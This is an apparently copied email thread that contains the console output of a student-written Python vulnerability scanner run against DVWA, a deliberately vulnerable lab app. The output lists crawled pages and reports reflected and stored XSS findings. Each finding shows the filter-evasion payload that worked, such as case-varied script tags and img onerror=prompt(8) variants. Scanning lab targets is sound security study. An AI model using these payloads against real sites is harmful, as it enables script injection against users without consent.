@@ -1,0 +1,1633 @@
+
+Conversation opened. 7 messages. All messages read.
+
+Skip to content
+Using Gmail with screen readers
+
+4 of 13,294
+(no subject)
+Inbox
+
+Nikhil Prakash
+Nov 30, 2022, 8:25 PM (1 day ago)
+import re import urllib.parse as urlparse from bs4 import BeautifulSoup import requests class Scanner: def __init__(self, url, ignore_links): self.session = req
+4
+
+Nikhil Prakash
+Attachments
+9:07 PM (51 minutes ago)
+to me, Khoushik
+
+
+3
+ Attachments
+  •  Scanned by Gmail
+
+Nikhil Prakash
+Attachments
+9:07 PM (51 minutes ago)
+to me, Khoushik
+
+
+ One attachment
+  •  Scanned by Gmail
+python VulnScanner.py
+
+
+1. My UCF
+2. Vulnweb
+3. DVWA
+4. Custom URL
+Enter your choice--> 3
+
+
+Enter IP Address of DVWA--> 192.168.128.128
+http://192.168.128.128/dvwa/dvwa/css/main.css
+http://192.168.128.128/dvwa/favicon.ico
+http://192.168.128.128/dvwa/
+http://192.168.128.128/dvwa/instructions.php
+http://192.168.128.128/dvwa/setup.php
+http://192.168.128.128/dvwa/vulnerabilities/brute/
+http://192.168.128.128/dvwa/vulnerabilities/exec/
+http://192.168.128.128/dvwa/vulnerabilities/csrf/
+http://192.168.128.128/dvwa/vulnerabilities/fi/?page=include.php
+http://192.168.128.128/dvwa/vulnerabilities/sqli/
+http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+http://192.168.128.128/dvwa/vulnerabilities/upload/
+http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+http://192.168.128.128/dvwa/security.php
+http://192.168.128.128/dvwa/phpinfo.php
+http://192.168.128.128/dvwa/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+http://192.168.128.128/dvwa/about.php
+http://192.168.128.128/dvwa/instructions.php?doc=PHPIDS-license
+http://192.168.128.128/dvwa/instructions.php?doc=readme
+http://192.168.128.128/dvwa/instructions.php?doc=changelog
+http://192.168.128.128/dvwa/instructions.php?doc=copying
+http://192.168.128.128/dvwa/security.php?phpids=on
+http://192.168.128.128/dvwa/security.php?phpids=off
+http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+http://192.168.128.128/dvwa/ids_log.php
+Some characters could not be decoded, and were replaced with REPLACEMENT CHARACTER.
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** XSS vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
